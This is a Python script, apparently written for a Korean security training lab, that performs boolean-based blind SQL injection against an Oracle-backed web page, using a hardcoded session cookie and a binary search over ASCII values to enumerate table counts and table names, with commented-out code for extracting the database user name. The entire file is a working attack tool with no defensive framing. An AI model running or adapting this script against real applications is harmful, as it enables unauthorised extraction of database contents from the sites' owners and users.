import requests
url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62 and {}"
cookies = {"JSESSIONID":"8DFF1B9BEF20C763A2B1F338AA428A91"}

def binarySearch(query):
        blindquery = "(" + query + ") > {}"
        baseurl = url.format(blindquery)
        min = 1
        max = 127
        while min < max:
            avg = int((min + max) / 2)
            attackurl = baseurl.format(avg)
            res = requests.get(attackurl, cookies=cookies)
            if '권한' in res.text:
                print('세션ID 교체!')
                break
            else:
                if 'MacBook' in res.text:
                    min = avg + 1
                else:
                    max = avg
        return min

# 테이블 개수
query = "select count(table_name) from user_tables"
tableCount = binarySearch(query)
print("테이블의 개수 : {}".format(tableCount))

for i in range(1, tableCount + 1):
    # 테이블명 길이
    query = "select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(i)
    tableLength = binarySearch(query)
    print("{}번째 테이블명 길이 : {}".format(i, tableLength))
    table_name = ''
    for j in range(1, tableLength + 1):
        # 테이블 한 글자씩
        query = "select ascii(substr(table_name, {}, 1)) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(j, i)
        table_name = table_name + chr(binarySearch(query))
    print("{}번째 테이블명 : {}".format(i, table_name))



#유저명 길이, 유저명
# lengthQuery = "select length(user) from dual"
# length = binarySearch(lengthQuery)
# print("유저명의 길이 : {}글자".format(length))
      
# for i in range(1, length + 1):
#     substrQuery = "select ascii(substr(user,{},1)) from dual".format(i)
#     print(chr(binarySearch(substrQuery)))
